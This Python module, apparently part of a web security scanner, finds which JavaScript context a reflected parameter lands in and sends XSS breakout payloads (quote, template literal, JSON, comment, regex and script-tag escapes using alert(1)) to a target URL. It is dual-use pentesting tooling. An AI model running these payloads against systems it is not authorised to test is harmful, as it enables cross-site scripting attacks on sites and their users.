"""Script context XSS — breaking out of JS strings, template literals, inline scripts."""

from __future__ import annotations

import re
from dataclasses import dataclass

import httpx


# Break out of single-quoted JS string  var x = 'USER_INPUT';
SINGLE_QUOTE_ESCAPE = [
    "';alert(1)//",
    "\\';alert(1)//",
    "'-alert(1)-'",
    "';alert(document.domain)//",
]

# Break out of double-quoted JS string  var x = "USER_INPUT";
DOUBLE_QUOTE_ESCAPE = [
    '";alert(1)//',
    '\\";alert(1)//',
    '"-alert(1)-"',
]

# Break out of template literal  var x = `USER_INPUT`;
TEMPLATE_LITERAL_ESCAPE = [
    "`+alert(1)+`",
    "${alert(1)}",
    "`; alert(1); var x=`",
]

# Break out of inline JSON  var config = {"key": "USER_INPUT"};
JSON_CONTEXT_ESCAPE = [
    '"}; alert(1); var x={"a":"',
    '"};alert(document.domain);//',
    '\\u0022};alert(1);//',          # Unicode quote bypass
]

# Break out of comment  /* USER_INPUT */  or  // USER_INPUT
COMMENT_ESCAPE = [
    "*/alert(1)/*",
    "\nalert(1)\n//",
    "*/alert(document.domain)//",
]

# Break out of regex literal  var re = /USER_INPUT/;
REGEX_ESCAPE = [
    "/+alert(1)+/",
    "/;alert(1);//",
]

# Fully break out of a <script> block into HTML
SCRIPT_TAG_BREAK = [
    "</script><script>alert(1)</script>",
    "</script><img src=x onerror=alert(1)>",
    "</script><svg onload=alert(1)>",
    "</ScRiPt><script>alert(1)</script>",
]

ALL_SCRIPT_CONTEXT_PAYLOADS = (
    SINGLE_QUOTE_ESCAPE + DOUBLE_QUOTE_ESCAPE + TEMPLATE_LITERAL_ESCAPE +
    JSON_CONTEXT_ESCAPE + COMMENT_ESCAPE + REGEX_ESCAPE + SCRIPT_TAG_BREAK
)

_SCRIPT_BLOCK = re.compile(r"<script[^>]*>(.*?)</script>", re.S | re.I)
_JS_STRING_SINGLE = re.compile(r"'([^'\\]|\\.)*XSSCTXPROBE")
_JS_STRING_DOUBLE = re.compile(r'"([^"\\]|\\.)*XSSCTXPROBE')
_JS_TEMPLATE = re.compile(r"`([^`\\]|\\.)*XSSCTXPROBE")


def detect_js_context(html: str) -> str:
    """Return the JS sub-context where the probe is reflected."""
    for script_m in _SCRIPT_BLOCK.finditer(html):
        js = script_m.group(1)
        if "XSSCTXPROBE" not in js:
            continue
        if _JS_STRING_SINGLE.search(js):
            return "single_quote"
        if _JS_STRING_DOUBLE.search(js):
            return "double_quote"
        if _JS_TEMPLATE.search(js):
            return "template_literal"
        if re.search(r"//.*XSSCTXPROBE", js):
            return "line_comment"
        if re.search(r"/\*.*XSSCTXPROBE", js, re.S):
            return "block_comment"
        if re.search(r"/[^/].*XSSCTXPROBE", js):
            return "regex"
        return "script_tag"
    return "html"


@dataclass
class ScriptFinding:
    type: str = "script_context"
    url: str = ""
    param: str = ""
    payload: str = ""
    js_context: str = ""
    evidence: str = ""
    severity: str = "P1"


class ScriptContext:
    """Identifies JS context and tests targeted escape payloads."""

    def __init__(self, session: httpx.Client | None = None):
        self.session = session or httpx.Client(timeout=20, follow_redirects=True)

    def scan(self, url: str, param: str) -> list[ScriptFinding]:
        context = self._detect(url, param)
        payloads = {
            "single_quote": SINGLE_QUOTE_ESCAPE,
            "double_quote": DOUBLE_QUOTE_ESCAPE,
            "template_literal": TEMPLATE_LITERAL_ESCAPE,
            "line_comment": COMMENT_ESCAPE,
            "block_comment": COMMENT_ESCAPE,
            "regex": REGEX_ESCAPE,
            "script_tag": SCRIPT_TAG_BREAK,
        }.get(context, ALL_SCRIPT_CONTEXT_PAYLOADS)

        findings: list[ScriptFinding] = []
        for payload in payloads:
            f = self._test(url, param, payload, context)
            if f:
                findings.append(f)
        return findings

    def _detect(self, url: str, param: str) -> str:
        try:
            resp = self.session.get(url, params={param: "XSSCTXPROBE"})
            return detect_js_context(resp.text)
        except Exception:
            return "unknown"

    def _test(self, url: str, param: str, payload: str, context: str) -> ScriptFinding | None:
        try:
            resp = self.session.get(url, params={param: payload})
        except Exception:
            return None
        body = resp.text
        triggered = any(t in body for t in ["alert(", "onerror=", "onload=", "<script"])
        if not triggered:
            return None
        idx = body.find(payload[:15]) if payload[:15] in body else 0
        evidence = body[max(0, idx - 50): idx + 120].replace("\n", "\\n")
        return ScriptFinding(url=url, param=param, payload=payload, js_context=context, evidence=evidence)
